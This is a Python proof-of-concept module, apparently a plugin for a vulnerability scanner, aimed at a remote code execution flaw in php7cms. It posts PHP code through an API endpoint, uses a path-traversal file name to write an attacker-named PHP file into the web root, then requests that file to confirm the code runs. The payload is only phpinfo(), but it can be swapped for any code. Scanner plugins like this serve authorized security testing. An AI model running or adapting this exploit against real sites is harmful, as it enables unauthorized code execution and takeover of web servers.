#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'php7cms getshell'
        self.keyword = ['php7cms']
        self.info = 'php7cms getshell'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://paper.tuisec.win/detail/2139f76293bdb43'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.base_url, '../php7cms/'),
                self.url_normpath(self.url, 'php7cms/'),
                self.url_normpath(self.url, '../php7cms/'),
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    postData = {
                        'data': '<?php phpinfo()?>'
                    }
                    url1 = path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
                    async with session.post(url=url1, data=postData) as res1:
                        if res1 != None:
                            url2 = path + 'adminsss.php'
                            async with session.get(url=url2) as res2:
                                if res2 !=None:
                                    text = await res2.text()
                                    if "php.ini" in text:
                                        self.flag = 1
                                        self.req.append({"url": url2})
                                        self.res.append({"info": url1, "key": "php7cms getshell"})
                                        break